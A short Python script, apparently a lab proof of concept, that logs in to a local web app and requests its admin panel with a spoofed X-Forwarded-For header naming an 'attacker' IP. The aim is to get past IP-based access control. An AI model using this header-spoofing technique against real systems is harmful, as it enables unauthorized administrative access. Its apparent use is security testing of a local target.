import requests

BASE_URL = "http://127.0.0.1:5004"

URL_LOGIN = f"{BASE_URL}/login"
URL_ADMIN_PAGE = f"{BASE_URL}/admin/panel"

USERNAME = "user1"
PASSWORD = "1234"
ATTACKER_IP = "10.15.15.20"

session = requests.Session()

headers = {
    "X-Forwarded-For": ATTACKER_IP
}

data_login = {
    "username": USERNAME,
    "password": PASSWORD
}

r_login = session.post(URL_LOGIN, data=data_login, headers=headers)

print("Login status:", r_login.status_code)


r_admin= session.get(URL_ADMIN_PAGE, headers=headers)

print("Admin status:", r_admin.status_code)
print("Admin response:", r_admin.text)

